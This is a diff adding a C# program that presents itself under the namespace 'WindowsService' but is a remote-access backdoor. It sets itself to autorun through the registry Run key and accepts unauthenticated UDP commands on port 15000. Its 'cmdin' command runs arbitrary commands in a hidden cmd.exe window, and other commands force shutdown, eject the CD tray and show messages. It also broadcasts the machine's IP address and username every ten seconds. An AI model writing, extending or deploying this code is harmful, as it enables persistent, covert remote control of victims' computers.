@@ -1,0 +1,175 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+using System.IO;
+using System.Security.Cryptography;
+using System.Security.Permissions;
+using Microsoft.Win32;
+using System.Threading;
+using System.Diagnostics;
+using System.Speech.Synthesis;
+
+namespace WindowsService
+{
+    public class Server
+    {
+    //TODO
+    }
+
+    public static class CDRom
+    {        
+        [DllImport("winmm.dll")]
+        static extern Int32 mciSendString(String command, StringBuilder buffer, Int32 bufferSize, IntPtr hwndCallback);
+        public static void OpenCDRom()
+        {
+            char dl = 'E';
+            DriveInfo[] allDrives = DriveInfo.GetDrives();
+            foreach (DriveInfo d in allDrives)
+            {
+                if (d.DriveType == DriveType.CDRom) dl = d.Name[0];
+            }
+            mciSendString("open "+dl+": type CDAudio alias drive"+dl, null, 0, IntPtr.Zero);
+            mciSendString("set drive"+dl+" door open", null, 0, IntPtr.Zero);
+        }
+        public static void CloseCDRom()
+        {
+            char dl = 'E';
+            DriveInfo[] allDrives = DriveInfo.GetDrives();
+            foreach (DriveInfo d in allDrives)
+            {
+                if (d.DriveType == DriveType.CDRom) dl = d.Name[0];
+            }
+            mciSendString("open " + dl + ": type CDAudio alias drive" + dl, null, 0, IntPtr.Zero);
+            mciSendString("set drive" + dl + " door closed", null, 0, IntPtr.Zero);
+        }
+    }
+
+    static class Program
+    {
+        static Thread rec = null;
+        static Thread send = null;
+        static UdpClient udp = new UdpClient(15000);
+        static bool stopReceive = false;
+        static bool SetAutorun(bool autorun)
+        {
+            string name = Process.GetCurrentProcess().MainModule.FileName;
+            string ExePath = System.Windows.Forms.Application.ExecutablePath;
+            RegistryKey reg;
+            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                if (autorun)
+                    reg.SetValue(name, ExePath);
+                else
+                    reg.DeleteValue(name);
+
+                reg.Close();
+            }
+            catch
+            {
+                return false;
+            }
+            return true;
+        }
+
+        [STAThread]
+        static void Main()
+        {
+            SetAutorun(true);
+            stopReceive = false;
+            rec = new Thread(new ThreadStart(Receive));
+            rec.Start();
+            send = new Thread(new ThreadStart(Sender));
+            send.Start();
+        }
+
+        static void Receive()
+        {
+            try
+            {
+                while (true)
+                {
+
+                    IPEndPoint ipendpoint = null;
+                    byte[] message = udp.Receive(ref ipendpoint);
+                    string msg = Encoding.Default.GetString(message);
+                    CMDM(msg);
+                    
+                    if (stopReceive == true) break;
+                }
+            }
+
+
+            catch (Exception e)
+            {
+                //MessageBox.Show(e.Message);
+            }
+        }
+        //Needed for DedSecScaner
+        static void Sender()
+        {
+            while(true)
+            {
+                Thread.Sleep(10000);
+
+                // send message
+                UdpClient udp = new UdpClient();                
+                IPAddress ipaddress = IPAddress.Broadcast;
+                IPEndPoint ipendpoint = new IPEndPoint(ipaddress, 14050);
+                string msg = "["+ Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString() +"]["+Environment.UserName+"]";
+                byte[] message = Encoding.Default.GetBytes(msg);
+                int sended = udp.Send(message, message.Length, ipendpoint);
+                udp.Close();
+            }
+        }
+        static void StopReceive()
+        {
+            stopReceive = true;
+            if (udp != null) udp.Close();
+            if (rec != null) rec.Join();
+        }
+        static void CMDM(string msg)
+        {
+            if (msg.ToLower()=="poweroff")
+            {
+                Process.Start("shutdown.exe"," -t 0 -s");
+            }
+            else if (msg.ToLower() == "opencd")
+            {
+                CDRom.OpenCDRom();
+            }
+            else if (msg.ToLower() == "closecd")
+            {
+                CDRom.CloseCDRom();
+            }
+            else if (msg.ToLower().IndexOf("cmdin") > -1)
+            {
+                msg = msg.Remove(0, 5);
+                Process p = new Process();
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/C " + msg;
+                p.Start();
+                p.Close();
+            }
+            else if (msg.ToLower().IndexOf("speak") > -1)
+            {
+                msg = msg.Remove(0, 5);
+                SpeechSynthesizer ss = new SpeechSynthesizer();
+                ss.Volume = 10;
+                ss.SpeakAsync(msg);
+            }
+            else if (msg.ToLower().IndexOf("msg") > -1)
+            {
+                msg = msg.Remove(0, 3);
+                MessageBox.Show(msg);
+            }
+        }
+    }
+}
